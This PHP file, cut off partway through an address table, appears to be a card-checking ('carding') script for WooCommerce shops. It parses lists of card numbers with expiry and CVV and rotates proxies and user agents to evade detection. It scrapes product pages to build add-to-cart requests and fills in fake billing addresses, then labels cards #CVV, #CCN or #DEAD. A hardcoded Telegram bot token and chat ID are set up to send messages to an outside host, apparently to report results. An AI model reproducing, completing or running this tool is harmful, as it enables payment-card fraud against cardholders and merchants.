<?php

# ------------- [ B3 WOO EDITED BY CURT ]

error_reporting(0);
date_default_timezone_set('Asia/Manila');

//curl_setopt_array($ch, [CURLOPT_COOKIEFILE => $gon, CURLOPT_COOKIEJAR => $gon]);
////////////////TELEGRAM///////////////////

// Telegram Bot API token and chat ID
$telegramToken = "7723561160:AAHZp0guO69EmC_BumauDsDeseTvh7GY3qA"; // Replace with your bot token
$chatId = "-1003705115530"; // Replace with your chat ID 

// Function to send message to Telegram
function sendToTelegram($message, $telegramToken, $chatId) {
    $url = "https://api.telegram.org/bot$telegramToken/sendMessage?chat_id=$chatId&text=" . urlencode($message);
    file_get_contents($url); // Send the message
}
#---------------COOOOOOOOOOKIEEEEEEEEE----------------------#
$gon = tempnam(sys_get_temp_dir(), 'cookie');
@unlink($gon);

# ------------ [ TIMEZONE ] -------------------- #

if ($_SERVER['REQUEST_METHOD'] == "POST") {
    extract($_POST);
} elseif ($_SERVER['REQUEST_METHOD'] == "GET") {
    extract($_GET);
    $time_start = microtime(true);
}
# ---------------- [ PHP ] ------------------- #

// Separate input string by "|"
$separa = explode("|", $lista);
$cc = $separa[0];
$mes = $separa[1];
$ano = $separa[2];
$cvv = $separa[3];

// Format credit card parts
$cc1 = substr($cc, 0, 4);
$cc2 = substr($cc, 4, 4);
$cc3 = substr($cc, 8, 4);
$cc4 = substr($cc, 12, 4);
$cc6 = substr($cc, 0, 6);

// Determine card type based on prefix
if (substr($cc, 0, 1) == '4') {
    $ctype = 'visa';
} elseif (substr($cc, 0, 1) == '5') {
    $ctype = 'mastercard';
} elseif (substr($cc, 0, 2) == '34' || substr($cc, 0, 2) == '37') {
    $ctype = 'americanexpress';
} elseif (substr($cc, 0, 4) == '6011' || substr($cc, 0, 2) == '65' || (substr($cc, 0, 6) >= '622126' && substr($cc, 0, 6) <= '622925')) {
    $ctype = 'discover';
} else {
    $ctype = 'unknown';
}

// Set brand and other card type representations
$brand = match ($ctype) {
    'visa' => 'Visa',
    'mastercard' => 'MasterCard',
    'americanexpress' => 'American Express',
    'discover' => 'Discover',
    default => 'Unknown'
};

$ctype1 = match ($ctype) {
    'visa' => 'VI',
    'mastercard' => 'MC',
    'americanexpress' => 'AE',
    'discover' => 'DI',
    default => null
};

$ctype2 = $brand;
$ctype3 = strtoupper($brand);

$ctype4 = match ($ctype) {
    'visa' => '001',
    'mastercard' => '002',
    'americanexpress' => '003',
    'discover' => '004',
    default => null
};

// Format year to ensure it follows the "20XX" format if not already
if (strlen($ano) === 2) {
    $ano = '20' . $ano;
}

// Remove leading zero from the month if present
 $mes1 = ltrim($mes, '0');

// Outputs: mes with leading zero, ano with "20" prefix
$mes_with_zero = str_pad($mes1, 2, '0', STR_PAD_LEFT);
$ano_with_20 = $ano;

// Outputs: mes without leading zero, ano without "20" prefix
 $ano_no_20 = substr($ano, -2);



# -------------- [ FUNCTIONS ] -------- #


function GetStr($string, $start, $end) {
    $str = explode($start, $string);
    $str = explode($end, $str[1]);  
    return $str[0];
}
function inStr($string, $start, $end, $value) {
    $str = explode($start, $string);
    $str = explode($end, $str[$value]);
    return $str[0];
}

# ---------- [ FORMKEY ] --- #
function GetRandomWord($len = 20) {

    $word = array_merge(range('a', 'z'), range('A', 'Z'));

    shuffle($word);
    return substr(implode($word), 0, $len);
}
$rcocks = GetRandomWord();
$formkey = substr(str_shuffle(mt_rand().mt_rand().$rcocks), 0, 16);
$Webkit = substr(str_shuffle(mt_rand().mt_rand().$Random), 0, 16);

# ---------------- [ DEVICE/CORRELATION ID ] ----- #
function DeviceID($length)
{
    $characters       = '0123456789abcdefghijklmnopqrstuvwxyz';
    $charactersLength = strlen($characters);
    $randomString     = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;
}
$DeviceSessionID = DeviceID(32);

#---------------- [ USER AGENT ] ------------------#

$user_agents = [
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0",
"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_1) AppleWebKit/604.3.5 (KHTML, like Gecko) Version/11.0.1 Safari/604.3.5",
"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:57.0) Gecko/20100101 Firefox/57.0",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.89 Safari/537.36 OPR/49.0.2725.47",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_2) AppleWebKit/604.4.7 (KHTML, like Gecko) Version/11.0.2 Safari/604.4.7",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36",
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:57.0) Gecko/20100101 Firefox/57.0",
"Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.108 Safari/537.36",
"Mozilla/5.0 (X11; Linux x86_64; rv:57.0) Gecko/20100101 Firefox/57.0",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36 Edge/15.15063",
"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:57.0) Gecko/20100101 Firefox/57.0",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 Edge/16.16299",
"Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/604.4.7 (KHTML, like Gecko) Version/11.0.2 Safari/604.4.7",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/604.3.5 (KHTML, like Gecko) Version/11.0.1 Safari/604.3.5",
"Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36",
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36",
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.108 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko",
"Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:52.0) Gecko/20100101 Firefox/52.0",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36 OPR/49.0.2725.64",
"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.108 Safari/537.36",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.1; rv:57.0) Gecko/20100101 Firefox/57.0",
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.106 Safari/537.36",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/604.4.7 (KHTML, like Gecko) Version/11.0.2 Safari/604.4.7",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:57.0) Gecko/20100101 Firefox/57.0",
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/62.0.3202.94 Chrome/62.0.3202.94 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; WOW64; rv:56.0) Gecko/20100101 Firefox/56.0",
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0",
"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko",
"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0",
"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0;  Trident/5.0)",
"Mozilla/5.0 (Windows NT 6.1; rv:52.0) Gecko/20100101 Firefox/52.0",
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/63.0.3239.84 Chrome/63.0.3239.84 Safari/537.36",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36",
"Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:57.0) Gecko/20100101 Firefox/57.0",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0",
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.108 Safari/537.36",
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.89 Safari/537.36",
"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/5.0;  Trident/5.0)",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/603.3.8 (KHTML, like Gecko) Version/10.1.2 Safari/603.3.8",
"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/604.3.5 (KHTML, like Gecko) Version/11.0.1 Safari/604.3.5",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/603.3.8 (KHTML, like Gecko) Version/10.1.2 Safari/603.3.8",
"Mozilla/5.0 (Windows NT 10.0; WOW64; rv:57.0) Gecko/20100101 Firefox/57.0",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393",
"Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0",
"Mozilla/5.0 (iPad; CPU OS 11_1_2 like Mac OS X) AppleWebKit/604.3.5 (KHTML, like Gecko) Version/11.0 Mobile/15B202 Safari/604.1",
"Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; Touch; rv:11.0) like Gecko",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:58.0) Gecko/20100101 Firefox/58.0",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Safari/604.1.38",
"Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36",
"Mozilla/5.0 (X11; CrOS x86_64 9901.77.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.97 Safari/537.36"
];

// Pagpili ng random na user agent
$ua = $user_agents[array_rand($user_agents)];


    # -------------- [ START PROXY ] -------------- #
$proxyuser = '';

if (isset($_POST['proxy']) || isset($_GET['proxy'])) {
    $proxyuser = $_POST['proxy'] ?? $_GET['proxy'];
}

$proxy_port = '';
$user_pass = '';

if (!empty($proxyuser)) {
    $proxy_parts = explode(':', $proxyuser);
    
    if (count($proxy_parts) >= 2) {
        $proxy_port = $proxy_parts[0] . ':' . $proxy_parts[1];
    }

    if (count($proxy_parts) == 4) {
        $user_pass = $proxy_parts[2] . ':' . $proxy_parts[3];
    }
}

function setupCurlProxy($ch, $proxy_port, $user_pass) {
    if (!empty($proxy_port)) {
        curl_setopt($ch, CURLOPT_PROXY, $proxy_port);
        curl_setopt($ch, CURLOPT_TIMEOUT, 20);
    }
    if (!empty($user_pass)) {
        curl_setopt($ch, CURLOPT_PROXYUSERPWD, $user_pass);
    }
}

function fetchCurrentIp($proxy_port = '', $user_pass = '') {
    $ch = curl_init();
    $urlToGet = 'https://ip.zxq.co/';
    curl_setopt($ch, CURLOPT_URL, $urlToGet);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);

    // Set up proxy if provided
    if (!empty($proxy_port)) {
        setupCurlProxy($ch, $proxy_port, $user_pass);
    }

    // Execute cURL and get response
    $ipdata = curl_exec($ch);
    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);

    // Handle cURL errors
    if ($ipdata === false) {
        $error = curl_error($ch);
         "cURL Error: $error\n";
        curl_close($ch);
        return false;
    }

    curl_close($ch);

    // Handle HTTP errors
    if ($http_code !== 200) {
        echo "HTTP Error: $http_code\n";
        return false;
    }

    // Decode JSON response and check if 'ip' field exists
    $responseData = json_decode($ipdata, true);
    if (isset($responseData['ip'])) {
        $query = $responseData['ip']; // Get the IP address

        // Mask the last two parts of the IP address
        $ipParts = explode('.', $query);
        $ipParts[2] = 'xxx';
        $ipParts[3] = 'xx';

        // Return the masked IP address
        return implode('.', $ipParts);
    } else {
         "IP address not found in the response.\n";
        return false;
    }
}

// Example usage:
$ip = fetchCurrentIp($proxy_port, $user_pass);
if ($ip !== false) {
     "Masked IP: $ip\n";
}

   
#--------------------- [ INPUT SITE ] ------------------#
ob_start();
$urls = explode(',', $_GET['sites']);

// Clean and reindex the array
$urls = array_values(array_map('trim', array_filter($urls)));

// Randomly select one URL
$lineNumbers = $urls[array_rand($urls)];

// Get the line number (1-based)
$lineNumber = array_search($lineNumbers, $urls) + 1;

// Parse URLs
$parsed_url = parse_url(trim($lineNumbers));
$product_page_url = $lineNumbers;
$url2 = parse_url($product_page_url);
$hostname = $url2['host'];

# ------------- [ RESPONSES ] ------------------ #
$time_total = round(microtime(true) - $time_start);
$badge_cvv = '<span style="background-color: green; color: white; padding: 2px 5px; border-radius: 5px; font-size: 12px;">#CVV</span>';
$badge_ccn = '<span style="background-color: green; color: white; padding: 2px 5px; border-radius: 5px; font-size: 12px;">#CCN</span>';
$badge_declined = '<span style="background-color: red; color: white; padding: 2px 5px; border-radius: 5px; font-size: 12px;">#DEAD</span>';

// Ensure $Site starts with http:// or https:// for correct redirection
if (strpos($hostname, 'http://') === false && strpos($hostname, 'https://') === false) {
    $hostname1 = 'http://' . $hostname;
}

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $product_page_url);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language: en-US,en;q=0.9',
    'cache-control: max-age=0',
    'origin: https://' . $hostname,
    'authority: https://' . $hostname,
    'content-type: application/x-www-form-urlencoded; charset=UTF-8',
    'referer: https://' . $hostname . '/cart',
    'sec-fetch-dest: document',
    'sec-fetch-mode: navigate',
    'sec-fetch-site: same-origin',
    'sec-fetch-user: ?1',
    'upgrade-insecure-requests: 1',
    'user-agent: ' . $ua,
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_PROXY, $proxy_port);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $user_pass);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
curl_setopt_array($ch, [CURLOPT_COOKIEFILE => $gon, CURLOPT_COOKIEJAR => $gon]);
$product_page_content = curl_exec($ch);
curl_close($ch);

$dom = new DOMDocument();
@$dom->loadHTML($product_page_content);
$xpath = new DOMXPath($dom);

$product_id = null;
$variation_data = null;
$errorresponse = null;

$form_nodes = $xpath->query('//form[@class="variations_form cart"]');
if ($form_nodes->length > 0) {
    $form_node = $form_nodes->item(0);
    $product_id = $form_node->getAttribute('data-product_id');
    $variation_data_attr = $form_node->getAttribute('data-product_variations');
    if ($variation_data_attr === "false") {
        $response = 'ATC Error: Failed to capture Variation ID';
    }
    
    $variation_data = json_decode(html_entity_decode($variation_data_attr), true);
}

if (!$product_id) {
    $product_id_node = $xpath->query('//input[@name="product_id" or @name="add-to-cart"]');
    if ($product_id_node->length > 0) {
        $product_id = $product_id_node->item(0)->getAttribute('value');
    }
}

if (!$product_id) {
    $button_node = $xpath->query('//button[@name="add-to-cart"]');
    if ($button_node->length > 0) {
        $product_id = $button_node->item(0)->getAttribute('value');
    }
}

if ($variation_data) {
    foreach ($variation_data as $variation) {
        $variation_id = $variation['variation_id'];
        $attributes = $variation['attributes'];

        foreach ($attributes as $key => $value) {
            // Process each attribute
        }
    }
}

if ($product_id) {
    $base_url = $product_page_url;
    $query_params = [
        'quantity' => 1,
        'add-to-cart' => $product_id
    ];

    if ($variation_data) {
        $first_variation = $variation_data[0];
        $variation_id = $first_variation['variation_id'];
        $attributes = $first_variation['attributes'];

        $query_params['attribute_' . key($attributes)] = reset($attributes);
        $query_params['product_id'] = $product_id;
        $query_params['variation_id'] = $variation_id;
    }

    $final_url = $base_url . '?' . http_build_query($query_params);

    // Output the final URL for adding to cart
     'Final URL: ' . $final_url;
} else {
     echo '<span style="color: #ffffffff; padding: 8px;"> #DEAD [CANT FIND PRODUCT SORRY!][AMOUNT:'.$price1.'] ['.$ip.'] <a href="' . $hostname1 . '" target="_blank">SITE</a>'.$lineNumber.'<br>
    <span style="color: #ff09b5ff; padding: 8px;"> INFO: '.$cardBrand.'-'.$cardtype.'-'.$cardlevel.' | '.$issuerName.' | '.$isoCountry.' <br><br>';
    exit;
}

#---------------- [ A D D R E S S ] --------------#
$urlComponents = parse_url($final_url);
$site2 = strtolower($urlComponents['host'] ?? '');

$addresses = [
'NZ' => [
    [
        'street' => '248 Princes Street',
        'city' => 'Grafton',
        'zip' => '1010',
        'state' => 'Auckland',
        'phone' => '(028) 8784-059',
    ],
    [
        'street' => '75 Queen Street',
        'city' => 'Auckland',
        'zip' => '1010',
        'state' => 'Auckland',
        'phone' => '(029) 1234-567',
    ],
    [
        'street' => '12 Victoria Avenue',
        'city' => 'Wanganui',
        'zip' => '4500',
        'state' => 'Manawatu-Wanganui',
        'phone' => '(021) 9876-543',
    ],
    [
        'street' => '34 Durham Street',
        'city' => 'Tauranga',
        'zip' => '3110',
        'state' => 'Bay of Plenty',
        'phone' => '(020) 1122-3344',
    ],
    [
        'street' => '9 Lambie Drive',
        'city' => 'Manukau',
        'zip' => '2025',
        'state' => 'Auckland',
        'phone' => '(027) 4444-555',
    ],
    [
        'street' => '153 Featherston Street',
        'city' => 'Wellington',
        'zip' => '6011',
        'state' => 'Wellington',
        'phone' => '(022) 3333-444',
    ],
    [
        'street' => '58 Moorhouse Avenue',
        'city' => 'Christchurch',
        'zip' => '8011',
        'state' => 'Canterbury',
        'phone' => '(023) 5555-666',
    ],
    ],
'AU' => [
    [
        'street' => '123 George Street',
        'city' => 'Sydney',
        'zip' => '2000',
        'state' => 'NSW',
        'phone' => '+61 2 1234 5678',
    ],
    [
        'street' => '456 Collins Street',
        'city' => 'Melbourne',
        'zip' => '3000',
        'state' => 'VIC',
        'phone' => '+61 3 8765 4321',
    ],
    [
        'street' => '789 Queen Street',
        'city' => 'Brisbane',
        'zip' => '4000',
        'state' => 'QLD',
        'phone' => '+61 7 9876 5432',
    ],
    [
        'street' => '101 King William Street',
        'city' => 'Adelaide',
        'zip' => '5000',
        'state' => 'SA',
        'phone' => '+61 8 1234 5678',
    ],
    [
        'street' => '202 Murray Street',
        'city' => 'Perth',
        'zip' => '6000',
        'state' => 'WA',
        'phone' => '+61 8 8765 4321',
    ],
    [
        'street' => '303 Hobart Road',
        'city' => 'Hobart',
        'zip' => '7000',
        'state' => 'TAS',
        'phone' => '+61 3 1234 9876',
    ],
    [
        'street' => '404 Darwin Avenue',
        'city' => 'Darwin',
        'zip' => '0800',
        'state' => 'NT',
        'phone' => '+61 8 8765 1234',
    ],
    ],
'JP' => [
    [
        'street' => '1 Chome-1-2 Oshiage',
        'city' => 'Sumida City, Tokyo',
        'zip' => '131-0045',
        'state' => 'Tokyo',
        'phone' => '+81 3-1234-5678',
    ],
    [
        'street' => '2-3-4 Shinjuku',
        'city' => 'Shinjuku, Tokyo',
        'zip' => '160-0022',
        'state' => 'Tokyo',
        'phone' => '+81 3-8765-4321',
    ],
    [
        'street' => '3 Chome-5-6 Akihabara',
        'city' => 'Chiyoda City, Tokyo',
        'zip' => '101-0021',
        'state' => 'Tokyo',
        'phone' => '+81 3-2345-6789',
    ],
    [
        'street' => '4-7-8 Ginza',
        'city' => 'Chuo City, Tokyo',
        'zip' => '104-0061',
        'state' => 'Tokyo',
        'phone' => '+81 3-3456-7890',
    ],
    [
        'street' => '5-9-10 Roppongi',
        'city' => 'Minato City, Tokyo',
        'zip' => '106-0032',
        'state' => 'Tokyo',
        'phone' => '+81 3-4567-8901',
    ],
    [
        'street' => '6-11-12 Harajuku',
        'city' => 'Shibuya City, Tokyo',
        'zip' => '150-0001',
        'state' => 'Tokyo',
        'phone' => '+81 3-5678-9012',
    ],
    [
        'street' => '7-13-14 Ueno',
        'city' => 'Taito City, Tokyo',
        'zip' => '110-0005',
        'state' => 'Tokyo',
        'phone' => '+81 3-6789-0123',
    ],
    ],
 'PH' => [
    [
        'street' => '1234 Makati Ave',
        'city' => 'Makati',
        'zip' => '1200',
        'state' => 'Metro Manila',
        'phone' => '+63 2 1234 5678',
    ],
    [
        'street' => '5678 Bonifacio Drive',
        'city' => 'Taguig',
        'zip' => '1634',
        'state' => 'Metro Manila',
        'phone' => '+63 2 8765 4321',
    ],
    [
        'street' => '4321 Quezon Blvd',
        'city' => 'Quezon City',
        'zip' => '1100',
        'state' => 'Metro Manila',
        'phone' => '+63 2 3344 5566',
    ],
    [
        'street' => '7890 Cebu South Rd',
        'city' => 'Cebu City',
        'zip' => '6000',
        'state' => 'Central Visayas',
        'phone' => '+63 32 123 4567',
    ],
    [
        'street' => '2468 Davao St',
        'city' => 'Davao City',
        'zip' => '8000',
        'state' => 'Davao Region',
        'phone' => '+63 82 987 6543',
    ],
    [
        'street' => '1357 Iloilo Blvd',
        'city' => 'Iloilo City',
        'zip' => '5000',
        'state' => 'Western Visayas',
        'phone' => '+63 33 765 4321',
    ],
    [
        'street' => '3690 Bacolod St',
        'city' => 'Bacolod City',
        'zip' => '6100',
        'state' => 'Western Visayas',
        'phone' => '+63 34 234 5678',
    ],
    ],
    'MY' => [
    [
        'street' => 'No 56, Jalan Bukit Bintang',
        'city' => 'Kuala Lumpur',
        'zip' => '55100',
        'state' => 'Wilayah Persekutuan',
        'phone' => '+60 3-1234 5678',
    ],
    [
        'street' => '700 Jln Sultan Iskandar Bintulu Service Industrial Est Bintulu Bintulu',
        'city' => 'Bintulu',
        'zip' => '97000',
        'state' => 'Sarawak',
        'phone' => '+60 608-6366666',
    ],
    [
        'street' => 'No 78, Jalan Ampang',
        'city' => 'Kuala Lumpur',
        'zip' => '50450',
        'state' => 'Wilayah Persekutuan',
        'phone' => '+60 3-8765 4321',
    ],
    [
        'street' => 'Lot 12, Jalan Tunku Abdul Rahman',
        'city' => 'Kuala Lumpur',
        'zip' => '50100',
        'state' => 'Wilayah Persekutuan',
        'phone' => '+60 3-9988 7766',
    ],
    [
        'street' => '123, Jalan Setia Raja',
        'city' => 'Ipoh',
        'zip' => '30000',
        'state' => 'Perak',
        'phone' => '+60 5-254 6789',
    ],
    [
        'street' => '45, Jalan Merdeka',
        'city' => 'George Town',
        'zip' => '10200',
        'state' => 'Penang',
        'phone' => '+60 4-222 3333',
    ],
    [
        'street' => '89, Jalan Bukit Rimau',
        'city' => 'Shah Alam',
        'zip' => '40000',
        'state' => 'Selangor',
        'phone' => '+60 3-5566 7788',
    ],
    [
        'street' => '12, Jalan Selesa Jaya',
        'city' => 'Johor Bahru',
        'zip' => '80000',
        'state' => 'Johor',
        'phone' => '+60 7-333 4444',
    ],
    ],
   'GB' => [
    [
        'street' => '10 Downing Street',
        'city' => 'London',
        'zip' => 'SW1A 2AA',
        'state' => '',
        'phone' => '+44 20 7925 0918',
    ],
    [
        'street' => '221B Baker Street',
        'city' => 'London',
        'zip' => 'NW1 6XE',
        'state' => '',
        'phone' => '+44 20 7224 3688',
    ],
    [
        'street' => '160 Piccadilly',
        'city' => 'London',
        'zip' => 'W1J 9EB',
        'state' => '',
        'phone' => '+44 20 7493 4944',
    ],
    [
        'street' => '30 St Mary Axe',
        'city' => 'London',
        'zip' => 'EC3A 8BF',
        'state' => '',
        'phone' => '+44 20 7626 1600',
    ],
    [
        'street' => '1-5 Cannon Street',
        'city' => 'London',
        'zip' => 'EC4N 5DX',
        'state' => '',
        'phone' => '+44 20 7606 1000',
    ],
    [
        'street' => '14 Regent Street',
        'city' => 'London',
        'zip' => 'SW1Y 4PH',
        'state' => '',
        'phone' => '+44 20 7930 0800',
    ],
    [
        'street' => '50 Queen Victoria Street',
        'city' => 'London',
        'zip' => 'EC4N 4SA',
        'state' => '',
        'phone' => '+44 20 7283 4000',
    ],
    ],
    'CA' => [
    [
        'street' => '123 Main Street',
        'city' => 'Toronto',
        'zip' => 'M5H 2N2',
        'state' => 'Ontario',
        'phone' => '(416) 555-0123',
    ],
    [
        'street' => '456 Maple Avenue',
        'city' => 'Vancouver',
        'zip' => 'V6E 1B5',
        'state' => 'British Columbia',
        'phone' => '(604) 555-7890',
    ],
    [
        'street' => '789 King Street',
        'city' => 'Montreal',
        'zip' => 'H3A 1J9',
        'state' => 'Quebec',
        'phone' => '(514) 555-3456',
    ],
    [
        'street' => '101 Wellington Street',
        'city' => 'Ottawa',
        'zip' => 'K1A 0A9',
        'state' => 'Ontario',
        'phone' => '(613) 555-6789',
    ],
    [
        'street' => '202 Spring Garden Road',
        'city' => 'Halifax',
